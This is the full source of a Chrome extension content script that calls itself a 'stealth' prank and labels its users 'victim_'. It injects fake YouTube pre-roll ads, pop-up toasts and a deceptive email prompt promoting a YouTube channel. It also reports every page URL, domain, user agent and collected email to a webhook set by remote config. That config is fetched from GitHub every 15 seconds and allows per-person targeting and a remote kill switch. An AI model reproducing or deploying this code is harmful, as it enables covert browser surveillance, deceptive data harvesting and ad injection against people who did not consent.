// Enhanced Chrome Extension - Per-User Targeting & Email Collection
// Comprehensive tracking with subscription monitoring

(function() {
    'use strict';
    
    console.log('SP: Starting enhanced stealth extension...');

    class SPEnhancedExtension {
        constructor() {
            this.configUrl = 'https://raw.githubusercontent.com/NachoPayback/6301912-SP-Ad-Pumper/master/config.json';
            this.config = {};
            this.userId = null;
            this.userEmail = null;
            this.disabled = false;
            this.userSettings = {}; // Merged defaults + overrides
            
            this.init();
        }

        async init() {
            try {
                // Get user identification
                await this.setupUserIdentification();
                
                // Load configuration and apply user-specific settings
                await this.loadConfigAndApplyUserSettings();
                
                if (this.disabled) return;
                
                // Start email collection if needed
                await this.handleEmailCollection();
                
                // Start prank behaviors with user-specific settings
                this.startPrankBehavior();
                
                // Regular config updates
                setInterval(() => this.loadConfigAndApplyUserSettings(), 15000);
                
            } catch (error) {
                console.error('Failed to initialize:', error);
            }
        }

        async setupUserIdentification() {
            try {
                const stored = await chrome.storage.local.get(['sp_user_id', 'sp_user_email']);
                
                // Get or create user ID
                if (stored.sp_user_id) {
                    this.userId = stored.sp_user_id;
                } else {
                    this.userId = 'victim_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
                    await chrome.storage.local.set({'sp_user_id': this.userId});
                }
                
                // Get stored email if available
                this.userEmail = stored.sp_user_email || null;
                
            } catch (error) {
                this.userId = 'victim_' + Math.random().toString(36).substr(2, 9);
            }
        }

        async loadConfigAndApplyUserSettings() {
            try {
                const response = await fetch(this.configUrl + '?t=' + Date.now());
                this.config = await response.json();
                
                // Emergency disable check
                if (this.config.emergency_disable) {
                    this.disabled = true;
                    this.clearEverything();
                    return;
                }
                
                // Apply user-specific settings (defaults + overrides)
                this.applyUserSpecificSettings();
                
                // Send heartbeat with user info
                this.sendUserHeartbeat();
                
            } catch (error) {
                console.error('Config load failed:', error);
            }
        }

        applyUserSpecificSettings() {
            // Start with defaults
            this.userSettings = JSON.parse(JSON.stringify(this.config.defaults || {}));
            
            // Check for user-specific overrides
            const userOverrides = this.config.user_overrides || {};
            
            // Try to find overrides by email first, then by userId
            let myOverrides = null;
            if (this.userEmail && userOverrides[this.userEmail]) {
                myOverrides = userOverrides[this.userEmail];
            } else if (userOverrides[this.userId]) {
                myOverrides = userOverrides[this.userId];
            }
            
            // Apply overrides if found
            if (myOverrides) {
                console.log('SP: Applying user-specific overrides for:', this.userEmail || this.userId);
                this.userSettings = this.deepMerge(this.userSettings, myOverrides);
                
                // Track that this user has custom settings
                this.trackEvent('user_override_applied', {
                    userId: this.userId,
                    email: this.userEmail,
                    overrideKeys: Object.keys(myOverrides)
                });
            }
        }

        deepMerge(target, source) {
            const result = {...target};
            for (const key in source) {
                if (source[key] && typeof source[key] === 'object' && !Array.isArray(source[key])) {
                    result[key] = this.deepMerge(result[key] || {}, source[key]);
                } else {
                    result[key] = source[key];
                }
            }
            return result;
        }

        async handleEmailCollection() {
            const emailConfig = this.config.email_collection;
            
            if (!emailConfig?.enabled || this.userEmail) {
                return; // Already have email or collection disabled
            }
            
            // Show email collection prompt after delay
            setTimeout(() => {
                this.showEmailCollectionPrompt(emailConfig);
            }, emailConfig.prompt_delay || 30000);
        }

        showEmailCollectionPrompt(emailConfig) {
            const prompt = document.createElement('div');
            prompt.setAttribute('data-sp-email-prompt', 'true');
            prompt.style.cssText = `
                position: fixed;
                top: 50%; left: 50%;
                transform: translate(-50%, -50%);
                background: white;
                padding: 25px;
                border-radius: 12px;
                box-shadow: 0 8px 25px rgba(0,0,0,0.3);
                z-index: 999999;
                font-family: Arial, sans-serif;
                max-width: 400px;
                text-align: center;
            `;
            
            prompt.innerHTML = `
                <div style="margin-bottom: 15px; font-size: 18px; font-weight: bold; color: #333;">
                    🛡️ ${emailConfig.prompt_text || 'Stay Updated!'}
                </div>
                <input type="email" id="sp-email-input" placeholder="${emailConfig.placeholder || 'Enter your email'}" 
                       style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; font-size: 14px;">
                <div style="margin-top: 15px;">
                    <button id="sp-email-submit" style="background: #2196F3; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; margin-right: 10px;">
                        Subscribe
                    </button>
                    <button id="sp-email-skip" style="background: #ccc; color: #333; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer;">
                        Skip
                    </button>
                </div>
            `;
            
            // Event handlers
            const emailInput = prompt.querySelector('#sp-email-input');
            const submitBtn = prompt.querySelector('#sp-email-submit');
            const skipBtn = prompt.querySelector('#sp-email-skip');
            
            submitBtn.onclick = async () => {
                const email = emailInput.value.trim();
                if (email && email.includes('@')) {
                    this.userEmail = email;
                    await chrome.storage.local.set({'sp_user_email': email});
                    
                    this.trackEvent('email_collected', {
                        userId: this.userId,
                        email: email,
                        method: 'voluntary_prompt'
                    });
                    
                    prompt.remove();
                    
                    // Reload config to apply any email-specific overrides
                    await this.loadConfigAndApplyUserSettings();
                }
            };
            
            skipBtn.onclick = () => {
                this.trackEvent('email_collection_skipped', {
                    userId: this.userId
                });
                prompt.remove();
            };
            
            document.body.appendChild(prompt);
        }

        startPrankBehavior() {
            const features = this.config.features || {};
            
            if (features.preroll && this.userSettings.preroll) {
                this.startVideoDetection();
            }
            
            if (features.toast && this.userSettings.toast) {
                this.startToastNotifications();
            }
            
            if (features.banners && this.userSettings.banners) {
                this.startBannerRotation();
            }
        }

        startVideoDetection() {
            const checkForVideos = () => {
                const videos = document.querySelectorAll('video, .html5-video-player video');
                
                videos.forEach(video => {
                    if (!video.hasAttribute('data-sp-hooked')) {
                        video.setAttribute('data-sp-hooked', 'true');
                        
                        video.addEventListener('play', () => {
                            if (this.shouldShowPreroll()) {
                                this.showPrerollOverlay(video);
                            }
                        });
                    }
                });
            };
            
            setInterval(checkForVideos, 2000);
            checkForVideos();
        }

        shouldShowPreroll() {
            const chance = this.userSettings.preroll?.chance || 0.3;
            return Math.random() < chance;
        }

        showPrerollOverlay(video) {
            const prerollSettings = this.userSettings.preroll;
            
            const overlay = document.createElement('div');
            overlay.setAttribute('data-sp-preroll', 'true');
            overlay.style.cssText = `
                position: absolute;
                top: 0; left: 0; right: 0; bottom: 0;
                background: black;
                z-index: 999999;
                display: flex;
                align-items: center;
                justify-content: center;
            `;
            
            overlay.innerHTML = `
                <div style="position: relative; width: 100%; height: 100%;">
                    <iframe width="100%" height="100%" 
                            src="https://www.youtube.com/embed/${prerollSettings.videoId}?autoplay=1" 
                            frameborder="0" allow="autoplay"></iframe>
                    
                    <div style="position: absolute; top: 10px; left: 10px; color: white; background: rgba(0,0,0,0.7); padding: 5px 10px; border-radius: 3px;">
                        Ad • Will end in <span id="countdown">${(prerollSettings.skipDelay || 5000)/1000}</span>s
                    </div>
                    
                    <button id="skip-btn" style="position: absolute; bottom: 10px; right: 10px; padding: 8px 15px; background: white; border: none; border-radius: 3px; cursor: pointer; display: none;">
                        Skip Ad
                    </button>
                    
                    <button id="visit-btn" style="position: absolute; bottom: 10px; left: 10px; padding: 8px 15px; background: #ff0000; color: white; border: none; border-radius: 3px; cursor: pointer;">
                        Visit Channel
                    </button>
                </div>
            `;
            
            const videoContainer = video.closest('.html5-video-player') || video.parentElement;
            videoContainer.style.position = 'relative';
            videoContainer.appendChild(overlay);
            
            // Timer and button functionality
            let timeLeft = (prerollSettings.skipDelay || 5000) / 1000;
            const countdown = overlay.querySelector('#countdown');
            const skipBtn = overlay.querySelector('#skip-btn');
            const visitBtn = overlay.querySelector('#visit-btn');
            
            const timer = setInterval(() => {
                timeLeft--;
                countdown.textContent = timeLeft;
                
                if (timeLeft <= 0) {
                    clearInterval(timer);
                    skipBtn.style.display = 'block';
                }
            }, 1000);
            
            // Track preroll shown
            this.trackEvent('preroll_shown', {
                userId: this.userId,
                email: this.userEmail,
                videoId: prerollSettings.videoId,
                isCustom: !!this.config.user_overrides?.[this.userEmail || this.userId]
            });
            
            // Button handlers
            skipBtn.onclick = () => {
                this.trackEvent('preroll_skipped', {
                    userId: this.userId,
                    email: this.userEmail,
                    timeWatched: ((prerollSettings.skipDelay || 5000)/1000) - timeLeft
                });
                overlay.remove();
            };
            
            visitBtn.onclick = () => {
                const url = prerollSettings.subscriptionUrl || 'https://www.youtube.com/c/ScammerPayback?sub_confirmation=1';
                window.open(url, '_blank');
                
                this.trackEvent('preroll_clicked', {
                    userId: this.userId,
                    email: this.userEmail,
                    subscriptionUrl: url
                });
                
                overlay.remove();
            };
        }

        startToastNotifications() {
            const toastSettings = this.userSettings.toast;
            const messages = toastSettings?.messages || [];
            
            if (!messages.length) return;
            
            const showToast = () => {
                const message = messages[Math.floor(Math.random() * messages.length)];
                
                const toast = document.createElement('div');
                toast.setAttribute('data-sp-toast', 'true');
                toast.style.cssText = `
                    position: fixed;
                    bottom: 20px; right: 20px;
                    background: #2196F3;
                    color: white;
                    padding: 15px 20px;
                    border-radius: 8px;
                    z-index: 999999;
                    cursor: pointer;
                    max-width: 300px;
                    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
                `;
                
                toast.innerHTML = `
                    <div style="font-weight: bold;">${message.icon || '🛡️'} ${message.title}</div>
                    <div style="font-size: 13px; margin-top: 5px;">${message.subtitle}</div>
                `;
                
                toast.onclick = () => {
                    const url = message.subscriptionUrl || 'https://www.youtube.com/c/ScammerPayback?sub_confirmation=1';
                    window.open(url, '_blank');
                    
                    this.trackEvent('toast_clicked', {
                        userId: this.userId,
                        email: this.userEmail,
                        messageId: message.id,
                        subscriptionUrl: url
                    });
                    
                    toast.remove();
                };
                
                document.body.appendChild(toast);
                
                // Track toast shown
                this.trackEvent('toast_shown', {
                    userId: this.userId,
                    email: this.userEmail,
                    messageId: message.id
                });
                
                setTimeout(() => {
                    if (toast.parentNode) {
                        this.trackEvent('toast_dismissed', {
                            userId: this.userId,
                            email: this.userEmail,
                            messageId: message.id,
                            method: 'timeout'
                        });
                        toast.remove();
                    }
                }, 8000);
            };
            
            // Start toast rotation
            setTimeout(() => {
                showToast();
                setInterval(showToast, toastSettings.frequency || 45000);
            }, 5000);
        }

        startBannerRotation() {
            // Banner implementation would go here
            console.log('Banner system would start with user settings:', this.userSettings.banners);
        }

        // Enhanced tracking with subscription monitoring
        trackEvent(eventType, data) {
            const eventData = {
                event: eventType,
                userId: this.userId,
                userEmail: this.userEmail,
                timestamp: Date.now(),
                url: window.location.href,
                domain: window.location.hostname,
                userAgent: navigator.userAgent,
                hasCustomSettings: !!(this.config.user_overrides?.[this.userEmail || this.userId]),
                ...data
            };
            
            this.sendData(eventData);
        }

        sendUserHeartbeat() {
            this.trackEvent('heartbeat', {
                hasEmail: !!this.userEmail,
                configVersion: this.config.version
            });
        }

        async sendData(data) {
            try {
                const webhookUrl = this.config.analytics?.webhook_url;
                
                if (webhookUrl) {
                    await fetch(webhookUrl, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            content: `\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``
                        })
                    });
                }
                
            } catch (error) {
                // Fail silently
            }
        }

        clearEverything() {
            const elements = document.querySelectorAll('[data-sp-preroll], [data-sp-toast], [data-sp-banner], [data-sp-email-prompt]');
            elements.forEach(el => el.remove());
            console.log('Extension disabled remotely');
        }
    }

    // Start the enhanced extension
    window.SPExtension = new SPEnhancedExtension();
    
})(); 